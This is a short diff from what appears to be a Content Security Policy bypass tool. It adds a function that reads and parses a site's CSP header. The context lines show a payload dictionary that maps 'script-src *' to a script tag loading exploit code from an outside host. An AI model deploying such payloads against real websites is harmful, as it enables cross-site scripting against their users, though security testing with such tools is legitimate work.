@@ -22,6 +22,18 @@ exploits_dic = {
     "script-src *" : '<script src="https://0xhorizon.eu/cspass/exploit.js"></script>'
 }
 
+def get_CSP(url):
+    policy = {}
+    r = requests.head(url)
+    if 'Content-Security-Policy' in r.headers.keys():
+        csp = r.headers['Content-Security-Policy']
+        for param in csp.split(';'):
+            matched = re.search("^([a-zA-Z0-9\-]+) (.*)", param.strip())
+            csp_name, csp_values = matched.groups()
+            csp_values = [v.rstrip("'").lstrip("'") for v in csp_values.split(' ')]
+            policy[csp_name] = csp_values
+    return policy
+
 def date_formatted():
     return datetime.datetime.now().strftime("%H:%M:%S")
 
